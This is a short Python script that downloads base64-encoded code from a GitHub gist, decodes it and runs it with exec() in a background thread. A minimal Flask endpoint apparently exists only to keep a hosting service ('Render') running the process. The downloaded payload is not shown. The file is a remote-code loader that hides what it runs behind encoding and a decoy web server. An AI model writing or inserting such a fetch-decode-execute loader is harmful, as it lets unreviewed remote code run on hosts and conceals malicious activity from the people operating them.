import os
import requests
import base64
from flask import Flask
import threading

def run_remote_code():
    URL = "https://gist.githubusercontent.com/ypkayla/a1fc44a209da2dba46a031a69f78174b/raw/eb78da6ac3b605353cd6368bcf7926fbab561015/ok"
    response = requests.get(URL)
    code_b64 = response.text.strip()

    exec(compile(base64.b64decode(code_b64), "<remote>", "exec"))

# Flask server to keep Render happy
app = Flask(__name__)

@app.route('/')
def index():
    return "Server is running"

if __name__ == '__main__':
    threading.Thread(target=run_remote_code).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
